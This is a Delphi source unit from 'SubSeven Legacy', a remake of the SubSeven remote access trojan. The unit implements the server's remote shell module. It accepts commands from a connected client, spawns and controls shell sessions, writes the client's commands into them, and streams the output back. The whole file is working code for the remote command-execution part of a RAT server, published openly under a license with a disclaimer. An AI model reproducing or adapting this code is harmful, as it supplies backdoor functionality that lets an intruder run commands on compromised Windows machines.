{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Thread.Net.Server.RemoteShell;

interface

uses System.Classes, Sub7.Thread.Net.Server.Peer.NonBlockingCmd,
     Sub7.Core.Protocol, XSuperObject, Sub7.Core.Shell.Emulator;

type
  TSub7ServerPeerRemoteShell = class(TSub7PeerNonBlockingCmd)
  private
    {@M}
    procedure ReadShellBuffers();
    procedure NewSession();
    procedure BreakShell(const AData : ISuperObject);
    procedure CloseShell(const AData : ISuperObject);
    procedure Command(const AData : ISuperObject);
  protected
    FShell : TS7Shell;
  public
    {@M}
    procedure OnIdle(); override;
    procedure OnBeforeCommandLoop(); override;
    procedure OnCommand(const ACommand : TS7Command; const AData : ISuperObject = nil); override;
    procedure OnAfterCommandLoop(); override;
  end;

implementation

uses Winapi.Windows, Sub7.Core.Exceptions, Sub7.Core.Bundle, Sub7.Core.Diagnostic,
     System.SysUtils, System.SyncObjs, Sub7.Core.Shell.Event, Winapi.Winsock2, System.Diagnostics;

{-------------------------------------------------------------------------------
  Spawn new terminal session
-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.NewSession();
var AGUID : String;
    AData : ISuperObject;
begin
  if not Assigned(FShell) then
    Exit();
  ///

  AGUID := FShell.New();

  AData := TSuperObject.Create();

  AData.S['session_id'] := AGUID;

  FIOHandler.SendCommand(rtNew, AData);
end;

{-------------------------------------------------------------------------------
  Send Break / CTRL+C to target shell session
-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.BreakShell(const AData : ISuperObject);
begin
  if not Assigned(AData) then
    Exit();
  ///

  if not AData.Contains('session_id') then
    raise ES7ParseException.Create(Format(ERR_MISSING_PARAMETER, ['session_id']));

  FShell.Break(AData.S['session_id']);
end;

{ TSub7ServerPeerRemoteShell

  Close a running shell (attached process) }
procedure TSub7ServerPeerRemoteShell.CloseShell(const AData : ISuperObject);
begin
  if not Assigned(AData) then
    Exit();
  ///

  if not AData.Contains('session_id') then
    raise ES7ParseException.Create(Format(ERR_MISSING_PARAMETER, ['session_id']));

  FShell.Close(AData.S['session_id']);
end;

{-------------------------------------------------------------------------------
  Send command to target shell session
-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.Command(const AData : ISuperObject);
begin
  if not Assigned(AData) then
    Exit();
  ///

  if not AData.Contains('session_id') then
    raise ES7ParseException.Create(Format(ERR_MISSING_PARAMETER, ['session_id']));

  if not AData.Contains('command') then
    raise ES7ParseException.Create(Format(ERR_MISSING_PARAMETER, ['command']));

  FShell.Write(AData.S['session_id'], AData.S['command']);
end;

{-------------------------------------------------------------------------------
  Dispatch Shell's Stdout's Buffer's to Client
-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.ReadShellBuffers();
var AChunk        : TS7ShellBufferChunk;
    AEvent        : TS7ShellEvent;
    AOutputString : AnsiString;
    AData         : ISuperObject;
begin
  while (FShell.Queue.PopItem(AEvent) = TWaitResult.wrSignaled) do begin
    try
      if Terminated then
        break;

      AData := TSuperObject.Create();

      AData.S['session_id'] := AEvent.GUID;

      if AEvent is TS7ShellBufferChunk then begin
        AChunk := TS7ShellBufferChunk(AEvent);

        SetString(AOutputString, PAnsiChar(AChunk.Buffer), AChunk.BufferSize);
        try
          AData.S['data'] := AOutputString;

          FIOHandler.SendCommand(rtData, AData);
        finally
          SetLength(AOutputString, 0);
        end;
      end else if AEvent is TS7ShellSessionEnded then begin
        FIOHandler.SendCommand(rtStopped, AData);
      end;
    finally
      if Assigned(AEvent) then
        FreeAndNil(AEvent);
    end;

    {
      If commands arrive, we priorize them. Why ? Let's imagine we run a "Tree c:\"
      this command will output tons of text to buffer, if remote user want to stop
      the command with a CTRL+C it will be stuck in pipe until the Tree command has
      finished.
    }
    if FIOHandler.DataAvailable then
      break;
  end;
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.OnIdle();
begin
  inherited OnIdle();
  ///

  {
    Read available data from buffer
  }
  self.ReadShellBuffers();
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.OnBeforeCommandLoop();
begin
  FShell := TS7Shell.Create();

  { We use this option to avoid some possible issues due to multithreading even
    if it might never happend }
  self.ForceKill := True;
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.OnCommand(const ACommand : TS7Command; const AData : ISuperObject = nil);
begin
  case ACommand of
    {
      Spawn e new shell
    }
    rtNew : begin
      self.NewSession();
    end;

    {
      Break Shell Command
    }
    rtBreak : begin
      self.BreakShell(AData);
    end;

    {
      Close shell
    }
    rtClose : begin
      self.CloseShell(AData);
    end;

    {
      New command for shell
    }
    rtCommand : begin
      self.Command(AData);
    end;
  end;
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerRemoteShell.OnAfterCommandLoop();
begin
  if Assigned(FShell) then
    FreeAndNil(FShell);
end;

end.
